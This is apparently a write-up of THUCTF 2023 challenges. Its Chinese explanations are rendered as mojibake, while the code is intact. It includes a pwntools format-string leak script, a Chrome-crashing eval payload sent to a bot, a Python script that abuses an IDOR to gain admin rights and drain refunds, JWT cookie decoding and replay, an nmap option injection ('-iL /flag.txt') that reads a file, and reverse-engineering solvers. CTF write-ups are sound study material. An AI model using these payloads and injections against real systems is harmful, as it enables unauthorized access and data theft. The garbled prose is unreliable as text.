### åˆå­¦ C è¯­è¨€

#### Level 1

ä»£ç ä¸­ `printf` çš„ format string å¯æ§åˆ¶ï¼Œä»è€Œå¯ä»¥é€šè¿‡ `%llx %llx %llx ... %llx` æˆ– `%7$llx` è¯»å–åˆ°æ ˆä¸Šçš„æ•°æ®ã€‚

```python
from pwn import *

# sh = process('./pwn')
sh = remote('chal.thuctf.redbud.info', 50296)

for i in range(10, 50):
    sh.sendlineafter(b'instruction:', f'llx:%{i}$llx'.encode())
    sh.recvuntil(b'llx:')
    line = sh.recvline().strip()
    if len(line) % 2 == 1:
        line = b'0' + line
    line = bytes.fromhex(line.decode())
    print(i, line[::-1]) # convert endian
```

![flag1](thuctf2023/c-flag1.png)

## Web

### ç®€å•çš„æ‰“å­—ç¨¿

<Card type="info" title="unintended solution">

éš”å£ GeekGame çš„ flag æ˜¯ `flag{.+}`ï¼Œç”¨ä¸‹é¢çš„åšæ³•ä¼šå› ä¸ºè¾“å‡ºå« `flag` è€Œâ€œç»·â€ï¼Œä½† THUCTF çš„ flag é‡Œä¸å« `flag`ï¼ˆ

</Card>

#### Level 1

è§¦å‘ `flag1` çš„ç±»å‹é”™è¯¯ï¼ŒæŸ¥çœ‹é”™è¯¯ä¿¡æ¯å³å¯ã€‚

```typescript
function f(a: flag1): null {
  return a;
}
```

![flag1](thuctf2023/ts-flag1.png)

#### Level 2

åŒæ ·æ˜¯è§¦å‘ç±»å‹é”™è¯¯ï¼Œç”±äºç±»å‹è¾ƒä¸ºå¤æ‚ï¼Œè·å–åˆ°å†…éƒ¨ç±»å‹éœ€è¦å¯¹ TypeScript æœ‰æ›´å¤šçš„äº†è§£ã€‚ä¸»è¦éš¾ç‚¹åœ¨äºæ•´ä¸ªè¾“å‡ºæœ‰é•¿åº¦é™åˆ¶ã€‚åœ¨æœ¬åœ°æŸ¥çœ‹é”™è¯¯ä¿¡æ¯å¯ä»¥å‘ç°ï¼Œé”™è¯¯ä¿¡æ¯ä¸­åŒ…å«ç±»å‹ä»¥åŠå¯¹åº”çš„æºä»£ç é‚£ä¸€è¡Œï¼Œæ‰€ä»¥å¯ä»¥ä»è¿™ä¸¤æ–¹é¢æ¥ç¼©çŸ­é”™è¯¯ä¿¡æ¯é•¿åº¦ï¼Œä¸€æ˜¯ä½¿ç”¨åå­—çŸ­çš„ç±»å‹ `any`ï¼ŒäºŒæ˜¯å°†æŠ¥é”™çš„é‚£ä¸€è¡Œç¼©çŸ­ä¸ºåªæœ‰å•ä¸ªå­—ç¬¦ `(`ã€‚

```typescript
function f(c: flag2) {
  if (!('prototype' in c)) return;
  const v = (new c()).v();

  v(
(
    a: any, b: any): null => {
      return null;
  });
}
```

![flag2](thuctf2023/ts-flag2.png)

### Chrone

#### Level 1

å°† query string è®¾å¾—éå¸¸é•¿ï¼Œå¯ä»¥è§¦å‘ 431 Request Header Fields Too Large é”™è¯¯ï¼Œè€Œåœ¨ Chrome ä¸­ï¼Œæ­¤æ—¶æ ‡ç­¾é¡µçš„åœ°å€ä¼šè¢«è®¾ä¸º `chrome-error://chromewebdata/`ï¼Œå°±è¾¾åˆ°äº†é¢˜ç›®è¦æ±‚çš„æ•ˆæœã€‚

payload å¯ä»¥æ˜¯ `/note?text=i_want_flag1i_want_flag1â€¦â€¦i_want_flag1`ï¼ŒåŠ é•¿åˆ°æŠ¥é”™ä¸ºæ­¢ã€‚

![flag1](thuctf2023/chrone-flag1.png)

#### Level 2

æ ¹æ®æç¤ºï¼Œéœ€è¦åœ¨è¿™ä¸ª `chrome-error://chromewebdata` æ’å…¥ DOM å…ƒç´ è®©æ•´ä¸ªæµè§ˆå™¨ crashã€‚

æµ‹è¯•çš„æ—¶å€™å¯ä»¥ç”¨ Chrome å¼€ä¸€ä¸ª 431 çš„æ ‡ç­¾é¡µç„¶ååœ¨ devtool è¿è¡Œ JSã€‚è¯•äº†ä¸‹å‘ç°æ’å…¥ `iframe` å¯ä»¥è®©æ ‡ç­¾é¡µ crash ä½†æµè§ˆå™¨æ²¡æœ‰ crashã€‚å†å°è¯•ä¿®æ”¹ `src`ï¼Œå‘ç° `src` éç©ºæ—¶ä¸ä¼š crashï¼Œä½†å¦‚æœæ’å…¥æ—¶éç©ºï¼Œæ’å…¥åå†ä¿®æ”¹ä¸ºç©ºï¼Œå°±ä¼š crashã€‚ä»£ç ä¸º `e=document.createElement('iframe'); e.src='http://localhost:8000/'; document.body.append(e); e.src=''`ã€‚

æœ€åè¦è®© bot æ‰§è¡Œä»£ç ï¼Œç”±äºæ˜¯å¤šå¥ä»£ç ï¼Œå¯ä»¥ç”¨ `eval` å˜æˆä¸€å¥ã€‚payload ä¸º `/note?js=eval(%22e%3Ddocument.createElement('iframe')%3B%20e.src%3D'http%3A%2F%2Flocalhost%3A8000%2F'%3B%20document.body.append(e)%3B%20e.src%3D''%22)&text=aaaaaaaaaaâ€¦â€¦`

![flag2](thuctf2023/chrone-flag2.png)

### V ME 50

æ³¨å†Œç™»å½•åå¯ä»¥åœ¨æ³¨é‡Šä¸­çœ‹åˆ° `role_change.php`ï¼Œç›´æ¥ä¿®æ”¹æç¤ºæ²¡æœ‰æƒé™ï¼Œä½†æœ‰ä¸€ä¸ª hidden field `id`ï¼Œå¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªæ³¨å†Œçš„ç”¨æˆ· id æ˜¯ 2ï¼Œç¬¬äºŒä¸ªæ³¨å†Œçš„æ˜¯ 3ï¼ŒçŒœæµ‹ 1 æ˜¯ç®¡ç†å‘˜ï¼Œæ”¹ä¸º 1 å³å¯æˆåŠŸä¿®æ”¹æƒé™ã€‚

ç„¶åå¯ä»¥è´­ä¹°ç‰©å“ä»¥åŠé€€æ¬¾ã€‚è¯•äº†ä¸‹å‘ç°ä¸€ä¸ªç”¨æˆ·è´­ä¹°çš„ç‰©å“å¯ä»¥è¢«å¦ä¸€ä¸ªç”¨æˆ·é€€æ¬¾ï¼Œæ‰€ä»¥å¤šæ³¨å†Œå‡ ä¸ªç”¨æˆ·é€€æ¬¾åˆ°åŒä¸€ä¸ªç”¨æˆ·å°±æœ‰é’±ä¹° flag äº†ã€‚

```python
import requests

url = "http://chal.thuctf.redbud.info:50970"

session = requests.session()

def register(username):
    session.post(f"{url}/register.php", data={"username": username, "password": "1"})

def login(username):
    session.post(f"{url}/login.php", data={"username": username, "password": "1"})

def changerole(username):
    session.post(f"{url}/role_change.php", data={"username": username, "id": "1", "role": "1"})

def buy(id):
    session.get(f"{url}/goods_api.php?method=buy&id={id}")

def refund(id):
    session.get(f"{url}/refund.php?method=cancel&id={id}")

def check(id):
    print(session.get(f"{url}/goods_api.php?method=check&id={id}").text)

for i in range(10):
    u = str(i)
    register(u)
    login(u)
    changerole(u)
    buy(1)
    buy(1)

for i in range(1, 21):
    refund(i)

buy(2)
check(21)
```

![flag](thuctf2023/vme50-flag.png)

### Emodle

#### Level 1

ç”±äºç­”æ¡ˆä¸å˜ï¼Œç›¸å½“äºå¯ä»¥è¿›è¡Œæ— é™æ¬¡çŒœæµ‹ã€‚

å¯ä»¥ä» https://unicode.org/Public/emoji/ ä¸‹è½½ emoji çš„ Unicode åˆ—è¡¨ï¼Œç„¶åé¦–å…ˆçŒœè‹¥å¹²æ¬¡ç¡®è®¤å“ªäº› emoji å‡ºç°äº†ï¼Œç„¶åå¯¹æ¯ä¸ªå‡ºç°äº†çš„ emoji çŒœä¸€æ¬¡å…¨æ˜¯è¿™ä¸ª emoji æ¥ç¡®å®šå…¶ä½ç½®ã€‚

```python
import re
import requests

port = 50258
url = f"http://chal.thuctf.redbud.info:{port}/level1"

emojis = []

with open("emoji-sequences.txt") as seq:
    for line in seq:
        if len(line) < 2 or line.startswith("#"):
            continue
        code = line.split()[0]
        if ".." in code:
            l, r = code.split("..")
        else:
            l, r = code, code
        for i in range(int(l, 16), int(r, 16) + 1):
            emojis.append(chr(i))


emojis = "".join(set(emojis))


def guess(g: str):
    res = requests.get(url, params={"guess": g})
    m = re.findall('results\\.push\\("([ğŸŸ¥ğŸŸ¨ğŸŸ©]*)"\\)', res.text)[0]
    result = []
    for c in m:
        if c == "ğŸŸ¥":
            result.append("r")
        elif c == "ğŸŸ¨":
            result.append("y")
        else:
            result.append("g")
    return result


answer = ["?"] * 64
charset = set()

for i in range(0, len(emojis), 64):
    res = guess(emojis[i : i + 64])
    for j in range(64):
        if i + j >= len(emojis):
            break
        if res[j] != "r":
            charset.add(emojis[i + j])

for e in charset:
    res = guess(e * 64)
    for j in range(64):
        if res[j] == "g":
            answer[j] = e

print("".join(answer))
```

![flag1](thuctf2023/emodle-flag1.png)

#### Level 2

åªçŒœ 8 æ¬¡åŸºæœ¬ä¸Šä¸å¯èƒ½çŒœå‡ºï¼Œéœ€è¦è½¬æ¢æ€è·¯ã€‚è¿™æ˜¯ä¸€é“ Web é¢˜ï¼Œæ‰€ä»¥çœ‹çœ‹å®ƒ Web çš„éƒ¨åˆ†ã€‚æ³¨æ„åˆ°å®ƒæœ‰ session åŠŸèƒ½ï¼Œé€šè¿‡ Cookie å®ç°ï¼Œè€Œ Cookie æ˜¯ JWTï¼Œpayload è§£ç å‡ºæ¥å°±åŒ…å«äº†ç­”æ¡ˆã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š

```
eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMiIsInJlbWFpbmluZ19ndWVzc2VzIjoiOCIsInRhcmdldCI6Ilx1RDgzRFx1REM3Q1x1RDgzRFx1REM3QVx1RDgzRFx1REM3OFx1RDgzRFx1REM2MFx1RDgzRFx1REM3Q1x1RDgzRFx1REM2N1x1RDgzRFx1REM1Mlx1RDgzRFx1REM1OFx1RDgzRFx1REM1NVx1RDgzRFx1REM1Rlx1RDgzRFx1REM2MFx1RDgzRFx1REM1RFx1RDgzRFx1REM4Mlx1RDgzRFx1REM0OFx1RDgzRFx1REM4Nlx1RDgzRFx1REM3OVx1RDgzRFx1REM0OFx1RDgzRFx1REM3Qlx1RDgzRFx1REM2Nlx1RDgzRFx1REM2NFx1RDgzRFx1REMzRlx1RDgzRFx1REM4OVx1RDgzRFx1REM1Q1x1RDgzRFx1REM2MVx1RDgzRFx1REM1Nlx1RDgzRFx1REM0Nlx1RDgzRFx1REM0MVx1RDgzRFx1REM2QVx1RDgzRFx1REM4OVx1RDgzRFx1REM1NVx1RDgzRFx1REM3Q1x1RDgzRFx1REM2Nlx1RDgzRFx1REM3Rlx1RDgzRFx1REM0M1x1RDgzRFx1REM0MVx1RDgzRFx1REM4N1x1RDgzRFx1REMzQlx1RDgzRFx1REM2Mlx1RDgzRFx1REM2Nlx1RDgzRFx1REM0Mlx1RDgzRFx1REM1NVx1RDgzRFx1REM1OFx1RDgzRFx1REM3QVx1RDgzRFx1REM4Mlx1RDgzRFx1REM0MVx1RDgzRFx1REM3NFx1RDgzRFx1REM1RVx1RDgzRFx1REM4NVx1RDgzRFx1REM3RVx1RDgzRFx1REM4MFx1RDgzRFx1REM0Nlx1RDgzRFx1REM3Rlx1RDgzRFx1REM1QVx1RDgzRFx1REM1Nlx1RDgzRFx1REM3Nlx1RDgzRFx1REM1Rlx1RDgzRFx1REM4NVx1RDgzRFx1REM1QVx1RDgzRFx1REM4Nlx1RDgzRFx1REM1Q1x1RDgzRFx1REM0NFx1RDgzRFx1REM4M1x1RDgzRFx1REM3OFx1RDgzRFx1REM3NSJ9LCJuYmYiOjE2OTcyNzMwODMsImlhdCI6MTY5NzI3MzA4M30.CUW8AK66IkZkgs2qmFtZaK-YcaaGvPK8QYr8cssmLV4
```

```
{"data":{"level":"2","remaining_guesses":"8","target":"\uD83D\uDC7C\uD83D\uDC7A\uD83D\uDC78\uD83D\uDC60\uD83D\uDC7C\uD83D\uDC67\uD83D\uDC52\uD83D\uDC58\uD83D\uDC55\uD83D\uDC5F\uD83D\uDC60\uD83D\uDC5D\uD83D\uDC82\uD83D\uDC48\uD83D\uDC86\uD83D\uDC79\uD83D\uDC48\uD83D\uDC7B\uD83D\uDC66\uD83D\uDC64\uD83D\uDC3F\uD83D\uDC89\uD83D\uDC5C\uD83D\uDC61\uD83D\uDC56\uD83D\uDC46\uD83D\uDC41\uD83D\uDC6A\uD83D\uDC89\uD83D\uDC55\uD83D\uDC7C\uD83D\uDC66\uD83D\uDC7F\uD83D\uDC43\uD83D\uDC41\uD83D\uDC87\uD83D\uDC3B\uD83D\uDC62\uD83D\uDC66\uD83D\uDC42\uD83D\uDC55\uD83D\uDC58\uD83D\uDC7A\uD83D\uDC82\uD83D\uDC41\uD83D\uDC74\uD83D\uDC5E\uD83D\uDC85\uD83D\uDC7E\uD83D\uDC80\uD83D\uDC46\uD83D\uDC7F\uD83D\uDC5A\uD83D\uDC56\uD83D\uDC76\uD83D\uDC5F\uD83D\uDC85\uD83D\uDC5A\uD83D\uDC86\uD83D\uDC5C\uD83D\uDC44\uD83D\uDC83\uD83D\uDC78\uD83D\uDC75"},"nbf":1697273083,"iat":1697273083}
```

![flag2](thuctf2023/emodle-flag2.png)

#### Level 3

level 3 çš„ JWT ä¸å†åŒ…å«ç­”æ¡ˆï¼Œä½†åŒ…å« seed å’Œå‰©ä½™çŒœæµ‹æ¬¡æ•°ã€‚è¿™è¯´æ˜æ¸¸æˆçŠ¶æ€å­˜äº client sideï¼Œä¸€ç›´ç”¨åŒä¸€ä¸ª Cookie è€Œä¸æ¥å—æœåŠ¡å™¨å‘æ¥çš„æ–° Cookie å³å¯æ— é™æ¬¡çŒœæµ‹ï¼Œç„¶åå°±å’Œ level 1 ä¸€æ ·äº†ï¼ˆä¸‹é¢çš„ä»£ç ä¸»è¦å°±æ˜¯æ”¹äº†ä¸ªè®¾ç½® Cookieï¼‰ã€‚

```python
import re
import requests

port = 50326
url = f"http://chal.thuctf.redbud.info:{port}/level3"

emojis = []

with open("emoji-sequences.txt") as seq:
    for line in seq:
        if len(line) < 2 or line.startswith("#"):
            continue
        code = line.split()[0]
        if ".." in code:
            l, r = code.split("..")
        else:
            l, r = code, code
        for i in range(int(l, 16), int(r, 16) + 1):
            emojis.append(chr(i))


emojis = "".join(set(emojis))

cookies = None

def guess(g: str):
    global cookies
    res = requests.get(url, params={"guess": g}, cookies=cookies)
    if cookies is None:
        cookies = res.cookies
    m = re.findall('results\\.push\\("([ğŸŸ¥ğŸŸ¨ğŸŸ©]*)"\\)', res.text)[0]
    result = []
    for c in m:
        if c == "ğŸŸ¥":
            result.append("r")
        elif c == "ğŸŸ¨":
            result.append("y")
        else:
            result.append("g")
    if result.count('g') == 64:
        print(res.text)
    return result


answer = ["?"] * 64
charset = set()

for i in range(0, len(emojis), 64):
    res = guess(emojis[i : i + 64])
    for j in range(64):
        if i + j >= len(emojis):
            break
        if res[j] != "r":
            charset.add(emojis[i + j])

for e in charset:
    res = guess(e * 64)
    for j in range(64):
        if res[j] == "g":
            answer[j] = e

guess("".join(answer))
```

![flag3](thuctf2023/emodle-flag3.png)

### é€ç•Œè®¡åˆ’

æ·»åŠ  nmap tracker integrationï¼Œè®¾ç½®å…¶å‘½ä»¤é€‰é¡¹ï¼Œä½¿ç”¨ `-iL /flag.txt` å¯ä»¥è¯»å–åˆ° flagï¼Œä½¿ç”¨ `-oN /config/home-assistant.log` å¯ä»¥å°†è¿è¡Œç»“æœæ˜¾ç¤ºåœ¨ log ä¸­ã€‚

![flag](thuctf2023/hass-flag.png)

## Reverse

### ç»å¦™çš„å¤šé¡¹å¼

#### Level 1

åç¼–è¯‘å¾—åˆ°æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼Œå…¶ä¸­ `mint` æ˜¯æ¨¡ 998244353 çš„è®¡ç®—ï¼Œå³ç®—å‡ºæ¥çš„æ˜¯â€œå°†è¾“å…¥å­—ç¬¦ä¸²è§†ä½œ 1~len è¿›åˆ¶æ•°â€æ¨¡ 998244353 çš„å€¼ï¼Œç„¶åè§£æ–¹ç¨‹å³å¯ã€‚ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ Lagrange æ’å€¼ã€‚ï¼‰

```cpp
for (i = 1; i <= flagLength; i = i + 1)
{
    sum = 0;
    exp = 1;
    for (j = 0; j < flagLength; j = j + 1)
    {
        x = (mint)mint::operator*((mint *)((long)j * 4 + (long)poly), exp);
        mint::operator+=((mint *)&sum, x);
        mint::mint((mint *)&i_m, i);
        mint::operator*=((mint *)&exp, i_m);
    }
    if (sum != (&DAT_00105020)[i - 1])
    {
        pbVar1 = std::operator<<((basic_ostream *)std::cout, "Failed, please try again!");
        std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1, std::endl<>);
        uVar3 = 1;
        goto LAB_00101a65;
    }
}
```

```python
mod = 998244353

c = [
    0x00000CB0,
    0x168C83AC,
    0x0D1D79D4,
    0x0228A0DD,
    0x00E57451,
    0x25F3BF43,
    0x0F1653F7,
    0x395B969F,
    0x37198928,
    0x1651D179,
    0x20F1DF11,
    0x38F4DC2B,
    0x37CDD474,
    0x2043323C,
    0x0E4CB532,
    0x14FE0ADA,
    0x2DADCE9D,
    0x2C325FFB,
    0x00D9357C,
    0x1C90D4E6,
    0x19A7E972,
    0x24EAABA9,
    0x2C2A70ED,
    0x315995C6,
    0x1E48BE27,
    0x099C05B0,
    0x0EE775B0,
    0x27F52AA6,
    0x136F26DB,
    0x05CE66CF,
    0x37F9958D,
    0x2D634F37,
    0x0F424CE3,
    0x2348C868,
    0x0A16629F,
    0x2ACC2B38,
    0x0F7FEB61,
    0x159215F5,
]

n = len(c)

a = []
for i in range(n):
    a.append([pow(i + 1, j, mod) for j in range(n)] + [c[i]])

for i in range(n):
    for j in range(i, n):
        if a[j][i]:
            a[i], a[j] = a[j], a[i]
            break
    inv = pow(a[i][i], -1, mod)
    for k in range(i, n + 1):
        a[i][k] = a[i][k] * inv % mod
    for j in range(n):
        if i == j:
            continue
        mul = a[j][i]
        for k in range(i, n + 1):
            a[j][k] = (a[j][k] - mul * a[i][k]) % mod

for i in range(n):
    print(chr(a[i][n]), end='')
```

![flag1](thuctf2023/poly-flag1.png)

#### Level 2

åç¼–è¯‘å‘ç°å¤šé¡¹å¼é•¿åº¦è¢«æ‰©å……åˆ°äº† 2 çš„å¹‚ï¼ˆå…¶å®åˆ°è¿™é‡Œå¦‚æœæ˜¯ OIer åº”è¯¥å·²ç»å¯ä»¥çœ‹å‡ºæ¥äº†ï¼›~~å…¶å®çœ‹åˆ°æ¨¡æ•°ç”šè‡³é¢˜ç›®åå°±åº”è¯¥æ—©çŒœåˆ°äº†~~ï¼‰ï¼š

```cpp
bVar1 = std::__lg(0x2f);
n = 2 << (bVar1 & 0x1f);
a = malloc((long)n << 2);
memset(a,0,(long)n * 4);
```

åé¢è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°ï¼Œæ ¸å¿ƒéƒ¨åˆ†å¦‚ä¸‹ï¼Œç¡®è®¤æ˜¯ [NTT](https://oi-wiki.org/math/poly/ntt/)ï¼š

```cpp
k = n;
while (1 < k)
{
    k = k / 2;
    for (i = 0; i < n; i = i + k * 2)
    {
        for (j = 0; j < k; j = j + 1)
        {
            uVar3 = *(undefined4 *)(&DAT_00505280 + (long)(k + j) * 4);
            local_38 = *(undefined4 *)(a + (long)(j + i) * 4);
            local_34 = *(undefined4 *)(a + (long)(k + i + j) * 4);
            iVar1 = j + i;
            uVar2 = mint::operator+((mint *)&local_38, SUB41(local_34, 0));
            *(undefined4 *)((long)iVar1 * 4 + a) = uVar2;
            local_30 = mint::operator-((mint *)&local_38, SUB41(local_34, 0));
            iVar1 = k + i + j;
            uVar3 = mint::operator*((mint *)&local_30, SUB41(uVar3, 0));
            *(undefined4 *)((long)iVar1 * 4 + a) = uVar3;
        }
    }
}
```

~~å»æ´›è°·ä¸Šæ‰¾åˆ°å¤±æ•£å¤šå¹´çš„å¤šé¡¹å¼æ¿å­~~ï¼Œè¿›è¡Œ NTT é€†å˜æ¢å³å¯ã€‚

```cpp
#include <algorithm>
#include <iostream>

using namespace std;

typedef long long ll;

const int mod = 998244353;
const int N = 64;
const int G = 3;

int n, r[N];

int a[N] = {
    0x00000fcc, 0x00000104, 0x0749db91, 0x343624e8, 0x0d13ca29, 0x272a2071, 0x36a7f6c3, 0x0c1a1e65,
    0x1f1ad239, 0x01f3ec88, 0x020a0b87, 0x36c3abd1, 0x05559031, 0x34c4b3f4, 0x12708155, 0x0c18c538,
    0x2afc9af2, 0x11eaefa9, 0x088b5998, 0x2cc0fd8f, 0x10370a24, 0x09c6d2a3, 0x29d08b05, 0x04f4d794,
    0x2c5f4e4e, 0x3a038304, 0x2071b91e, 0x1b445996, 0x31373cf5, 0x21e86de9, 0x37bf21f8, 0x2f9134fb,
    0x21770505, 0x027a31ad, 0x1043be97, 0x0c84bff9, 0x2e286891, 0x27a8054e, 0x3886de12, 0x20e03387,
    0x1bfe24ef, 0x01839cf5, 0x2562af12, 0x09009f44, 0x284b4a3b, 0x2eaa70ec, 0x0859bba4, 0x1507cc41,
    0x3b34c2e5, 0x2a5819f3, 0x2a1aa122, 0x15c8a1b3, 0x2b94d4e7, 0x3760071c, 0x2e63c3af, 0x315e10bd,
    0x0b54503c, 0x06f4408e, 0x09400d3e, 0x38b88f00, 0x336d0b03, 0x164dcc04, 0x2edbbdf1, 0x0e53e235};

int qpow(int x, int y)
{
    int out = 1;
    while (y)
    {
        if (y & 1)
            out = (ll)out * x % mod;
        x = (ll)x * x % mod;
        y >>= 1;
    }
    return out;
}

void ntt(int *A, int type, int L)
{
    int i, j, k, wn, w, t;
    for (i = 1; i < L; ++i)
        if (i < r[i])
            swap(A[i], A[r[i]]);
    for (i = 1; i < L; i <<= 1)
    {
        wn = qpow(G, (mod - 1) / (i << 1));
        for (j = 0; j < L; j += i * 2)
        {
            for (k = 0, w = 1; k < i; ++k, w = (ll)w * wn % mod)
            {
                t = (ll)A[i + j + k] * w % mod;
                A[i + j + k] = (A[j + k] - t + mod) % mod;
                A[j + k] = (A[j + k] + t) % mod;
            }
        }
    }
    if (type == -1)
    {
        reverse(A + 1, A + L);
        int inv = qpow(L, mod - 2);
        for (i = 0; i < L; ++i)
            A[i] = (ll)A[i] * inv % mod;
    }
}

int main()
{
    ntt(a, -1, N);

    for (int i = 0; i < N; ++i)
        putchar(a[i]);
}
```

![flag2](thuctf2023/poly-flag2.png)

#### Level 3

åç¼–è¯‘å‘ç°æ˜¯å¤šé¡¹å¼ä¹˜æ³•ï¼š

```cpp
n = 2 << (bVar1 & 0x1f);
a = malloc((long)(n * 2) << 2);
b = malloc((long)(n * 2) << 2);
memset(a,0,(long)(n * 2) * 4);
memset(b,0,(long)(n * 2) * 4);
for (i1 = 0; i1 < len; i1 = i1 + 1) {
    pcVar3 = (char *)std::__cxx11::basic_string<>::operator[]((ulong)local_48);
    mint::mint((mint *)&local_78,(int)*pcVar3);
    *(undefined4 *)((long)i1 * 4 + (long)a) = local_78;
}
for (i2 = 0; i2 < n; i2 = i2 + 1) {
    mint::mint((mint *)&local_78,u_welcome_to_the_world_of_polynomi_00305020[i2 % 0x22]);
    *(undefined4 *)((long)i2 * 4 + (long)b) = local_78;
}
FUN_001014be(a,n * 2);
FUN_001014be(b,n * 2);
for (i3 = 0; i3 < n * 2; i3 = i3 + 1) {
    mint::operator*=((mint *)((long)a + (long)i3 * 4),
                    SUB41(*(undefined4 *)((long)i3 * 4 + (long)b),0));
}
FUN_00101627(a,n * 2);
```

æ±‚é€†ç„¶åä¹˜èµ·æ¥å³å¯ï¼š

```cpp
#include <algorithm>
#include <cstring>
#include <iostream>

using namespace std;

typedef long long ll;

const int mod = 998244353;
const int N = 64;
const int G = 3;

int n, r[N * 2];

int c[N * 2] = {
    0x0000270c, 0x0000429c, 0x0000675b, 0x00007f8a, 0x0000a59b, 0x0000c1cd, 0x0000f6cb, 0x00010e02,
    0x00012f88, 0x00014c8b, 0x00015525, 0x00018924, 0x0001a398, 0x0001b545, 0x0001c2af, 0x0002018c,
    0x0001fdd4, 0x00023333, 0x00026068, 0x00029557, 0x00028aef, 0x0002a872, 0x0002e6e4, 0x0002ee5e,
    0x00030a9d, 0x00030cee, 0x00033ec0, 0x0003629a, 0x00037487, 0x00039d4e, 0x0003e2f7, 0x0003eccf,
    0x0004304b, 0x00045d64, 0x0004715e, 0x0004c474, 0x0004ea5e, 0x0004f081, 0x0004fe29, 0x00052656,
    0x00053dc1, 0x0005355a, 0x00054bb5, 0x0005560c, 0x0005296c, 0x0005523e, 0x00054cba, 0x00053930,
    0x0005265f, 0x000552f2, 0x0005316a, 0x00053e95, 0x00055823, 0x000564b7, 0x00052cdc, 0x00051228,
    0x00055f28, 0x00054d58, 0x0005454b, 0x00052f57, 0x00054d6f, 0x00053e11, 0x00055f91, 0x00055a50};

const char s[] = "welcome to the world of polynomial";
int a[N * 2], b[N * 2], aa[N * 2], bb[N * 2];

int qpow(int x, int y)
{
    int out = 1;
    while (y)
    {
        if (y & 1)
            out = (ll)out * x % mod;
        x = (ll)x * x % mod;
        y >>= 1;
    }
    return out;
}

void ntt(int *A, int type, int L)
{
    int i, j, k, wn, w, t;
    for (i = 1; i < L; ++i)
        if (i < r[i])
            swap(A[i], A[r[i]]);
    for (i = 1; i < L; i <<= 1)
    {
        wn = qpow(G, (mod - 1) / (i << 1));
        for (j = 0; j < L; j += i * 2)
        {
            for (k = 0, w = 1; k < i; ++k, w = (ll)w * wn % mod)
            {
                t = (ll)A[i + j + k] * w % mod;
                A[i + j + k] = (A[j + k] - t + mod) % mod;
                A[j + k] = (A[j + k] + t) % mod;
            }
        }
    }
    if (type == -1)
    {
        reverse(A + 1, A + L);
        int inv = qpow(L, mod - 2);
        for (i = 0; i < L; ++i)
            A[i] = (ll)A[i] * inv % mod;
    }
}

void polyinv(int L)
{
    if (L == 1)
    {
        b[0] = qpow(a[0], mod - 2);
        return;
    }
    int i;
    polyinv(L >> 1);
    memset(bb, 0, sizeof(bb));
    memcpy(bb, b, sizeof(int) * (L >> 1));
    memcpy(aa, a, sizeof(int) * L);
    for (i = 0; i < (L << 1); ++i)
        r[i] = (r[i >> 1] >> 1) | ((i & 1) * L);
    ntt(aa, 1, L << 1);
    ntt(bb, 1, L << 1);
    for (i = 0; i < (L << 1); ++i)
        aa[i] = (ll)aa[i] * bb[i] % mod * bb[i] % mod;
    ntt(aa, -1, L << 1);
    for (i = 0; i < L; ++i)
        b[i] = (2ll * b[i] - aa[i] + mod) % mod;
}

int main()
{
    for (int i = 0; i < N; ++i)
        a[i] = s[i % 0x22];

    polyinv(N);
    ntt(b, 1, N * 2);
    ntt(c, 1, N * 2);
    for (int i = 0; i < N * 2; ++i)
        a[i] = (ll)b[i] * c[i] % mod;
    ntt(a, -1, N * 2);

    for (int i = 0; i < N; ++i)
        putchar(a[i]);
}

```

![flag3](thuctf2023/poly-flag3.png)

### æ±‰åŒ–ç»¿è‰²ç‰ˆå…è´¹ä¸‹è½½

#### Level 1

ä½¿ç”¨ [xp3-tool](https://github.com/storycraft/xp3-tool) è§£å‹ `data.xp3`ï¼Œåœ¨ `scenario/done.ks` ä¸­çœ‹åˆ° flagã€‚

![flag1](thuctf2023/æ±‰åŒ–ç»¿è‰²ç‰ˆ-flag1.png)

#### Level 2

æ ¹æ® `scenario` ä¸­çš„æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°æ£€æŸ¥ä¸¤æ¬¡è¾“å…¥æ˜¯å¦ç›¸åŒæ˜¯é€šè¿‡è®¡ç®— hash å®ç°çš„ã€‚

ä½¿ç”¨ [KirikiriDescrambler](https://github.com/arcusmaximus/KirikiriTools) è§£å¯† `savedata` ä¸­çš„æ–‡ä»¶ï¼Œåœ¨ `data0.kdt` ä¸­å¾—åˆ° round 1 çš„ hash ä¸º 7748521ï¼Œåœ¨ `datasu.ksd` ä¸­å¾—åˆ°æ¯ä¸ªå­—ç¬¦ä½¿ç”¨çš„æ¬¡æ•°ï¼Œç„¶åæšä¸¾æ’åˆ—å¾—åˆ° flagã€‚

```cpp
#include <algorithm>
#include <cstdio>
#include <vector>

using namespace std;

const int mod = 0x125e591;
const int k = 13337;
const int start = 1337;
const int target = 7748521;

const char charset[] = " AEIOU";

bool check(const vector<int> &a)
{
    int h = start;
    for (int x : a)
        h = (1ll * h * k + x * 11) % mod;
    h = (1ll * h * k + 66) % mod;
    return h == target;
}

int main()
{
    vector<int> a = {1, 1, 1, 1, 1, 1, 2, 2, 2, 3, 4, 4, 4, 4, 4, 4};

    do
    {
        if (check(a))
        {
            for (int x : a)
                putchar(charset[x]);
            break;
        }
    } while (next_permutation(a.begin(), a.end()));
}
```

![flag2](thuctf2023/æ±‰åŒ–ç»¿è‰²ç‰ˆ-flag2.png)

## Forensics

### Z å…¬å¸çš„æœåŠ¡å™¨

#### Level 1

åœ¨ `konsole` ä¸­ä½¿ç”¨ `nc` è¿æ¥åˆ°å®ä¾‹ä¼šæç¤ºä¸º ZMODEM é€‰æ‹©å­˜å‚¨ä½ç½®ï¼Œä½†é€‰å®Œä¹‹åä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“æ˜¯ä¸ºä»€ä¹ˆã€‚ä½†çŸ¥é“æ˜¯ ZMODEM å°±å¯ä»¥åœ¨ç½‘ä¸Šæœç´¢å·¥å…·ï¼Œæœ€åæœåˆ°çš„æ˜¯ Windows ä¸‹çš„ Tera Termï¼Œæ€»ä¹‹å®ƒå¯ä»¥æ­£å¸¸å·¥ä½œï¼ˆï¼Œè¿ä¸Šå®ä¾‹é€‰æ‹© ZMODEM receive å³å¯ã€‚

![Tera Term](thuctf2023/zserver-teraterm.png)

![flag1](thuctf2023/zserver-flag1.png)

#### Level 2

